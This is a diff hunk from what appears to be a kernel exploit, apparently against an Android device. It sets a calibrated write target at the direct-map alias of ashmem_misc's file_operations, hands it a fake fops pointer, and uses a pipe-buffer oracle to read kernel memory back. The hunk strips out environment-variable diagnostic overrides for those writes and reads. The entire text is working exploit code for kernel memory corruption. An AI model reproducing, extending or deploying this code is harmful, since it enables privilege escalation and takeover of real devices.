@@ -658,55 +658,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     slide_bank_payload_base = payload_base;
     slide_bank_parents[0] = fake_fops;
-    /* Calibrated target: see runtime_image_alias().  The kernel image is
-     * physically loaded at 0x28000000 + va_slide, so the runtime direct-map
-     * alias of image offset O is P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) +
-     * slide_p0_offset + O (slide_p0_offset = converted va_slide). */
+    /* Calibrated write target: see runtime_image_alias().  On q7mq the
+     * kernel image is physically loaded at 0x28000000 + va_slide, so the
+     * runtime direct-map alias of image offset O is
+     * P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) + slide_p0_offset + O with
+     * slide_p0_offset holding the CONVERTED va_slide. */
     slide_bank_targets[0] = runtime_fops_alias();
-    /* FOPS_DIAG_TARGET=<hex>: redirect the baked-in fops write target
-     * (non-destructive configfs verification; no pipe redirects). */
-    const char *fops_target_arg = getenv("FOPS_DIAG_TARGET");
-    if (fops_target_arg && *fops_target_arg) {
-      slide_bank_targets[0] = (uintptr_t)strtoull(fops_target_arg, NULL, 0);
-      pr_info("FOPS diag write target override -> %016zx\n",
-              slide_bank_targets[0]);
-    }
     pr_info("FOPS bank target=%016zx (calibrated, slide=%08zx)\n",
             slide_bank_targets[0], slide_p0_offset);
-    /* FOPS_DIAG_PIPE_TARGET: redirect the baked-in write node at a pipe
-     * page so the FOPS trigger can be verified via the pipe oracle
-     * WITHOUT needing fake_fops/configfs.  This isolates whether the
-     * FOPS-mode trigger performs the rb_erase write at all. */
-    if (getenv("FOPS_DIAG_PIPE_TARGET")) {
-      slide_bank_targets[0] = pipebuf_page_base +
-                              P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
-      /* FOPS_DIAG_KEEP_PARENT keeps fake_fops as the written value;
-       * FOPS_DIAG_PARENT=<hex> overrides the value explicitly;
-       * otherwise use a vmemmap page-struct like the working p0 probe. */
-      const char *parent_arg = getenv("FOPS_DIAG_PARENT");
-      if (parent_arg && *parent_arg) {
-        slide_bank_parents[0] = (uintptr_t)strtoull(parent_arg, NULL, 0);
-      } else if (!getenv("FOPS_DIAG_KEEP_PARENT")) {
-        slide_bank_parents[0] = direct_to_page(payload_base);
-      }
-      pr_info("FOPS diag pipe target parent=%016zx target=%016zx\n",
-              slide_bank_parents[0], slide_bank_targets[0]);
-    } else if (getenv("FOPS_DIAG_READBACK")) {
-      /* Non-circular READ of ashmem_misc.fops: redirect a pipe buffer
-       * page field at the real fops page, then the pipe oracle dump
-       * shows the actual 8-byte fops pointer at offset +0x10. */
-      uintptr_t misc_fops = runtime_fops_alias();
-      const char *target_arg = getenv("FOPS_DIAG_READBACK_TARGET");
-      if (target_arg && *target_arg) {
-        misc_fops = (uintptr_t)strtoull(target_arg, NULL, 0);
-      }
-      slide_bank_parents[0] = direct_to_page(misc_fops);
-      slide_bank_targets[0] = pipebuf_page_base +
-                              P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
-      pr_info("FOPS diag readback parent=%016zx target=%016zx "
-              "(misc_fops=%016zx)\n",
-              slide_bank_parents[0], slide_bank_targets[0], misc_fops);
-    }
   }
 #endif
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
